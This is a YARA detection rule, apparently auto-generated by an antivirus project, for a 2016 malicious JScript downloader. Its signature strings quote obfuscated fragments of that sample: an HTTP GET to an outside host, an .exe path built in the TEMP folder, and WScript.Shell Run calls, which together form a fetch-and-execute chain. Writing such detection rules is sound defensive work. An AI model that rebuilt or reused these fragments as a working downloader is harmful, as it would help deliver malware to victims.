rule sig_20160329_b4689b9bc5192d706eaf703532bb30e7 {
  meta:
    description = "datamaliciousorder - file 20160329_b4689b9bc5192d706eaf703532bb30e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6ed871bd989b8c7f1a5894228a6f30082b9d62802e305d98ae7efdda81ffa9ad"

  strings:
    $s1  = "l[ZL](\"GET\", \"http://icurlers.com/sodp1os\", false);" fullword ascii
    $s2  = "function pt() {return mQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"U4fGm0rfXAgLV.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[ja](Q() * 11); if (l[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var mQ = function ym() {return WScript[q](\"WScript.Shell\");}(), I = 11;" fullword ascii
    $s5  = "function SB(uR, cE){A = A * 1; return uR - cE;};" fullword ascii
    $s6  = "function g(){return \"\" + oe;};" fullword ascii
    $s7  = "function dk(Qh){mQ[\"Run\"](Qh, A, A);};" fullword ascii
    $s8  = "function V() {return ((y == true) && (y == i)) ? 1 : A;};" fullword ascii
    $s9  = "function lO(){return q;};" fullword ascii
    $s10 = "var gR = new this[\"Date\"]();" fullword ascii
    $s11 = "function Q(){return 22;};" fullword ascii
    $s12 = "function Vc(W) {var k = (1, 2, 3, 4, 5, W); return k;};" fullword ascii
    $s13 = "function fZ()" fullword ascii
    $s14 = "return SB(wX, du);" fullword ascii
    $s15 = " while (Fh){" fullword ascii
    $s16 = "var y = false;" fullword ascii
    $s17 = "y = true; " fullword ascii
    $s18 = "var i = false;" fullword ascii
    $s19 = "i = true; " fullword ascii
    $s20 = "var wh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}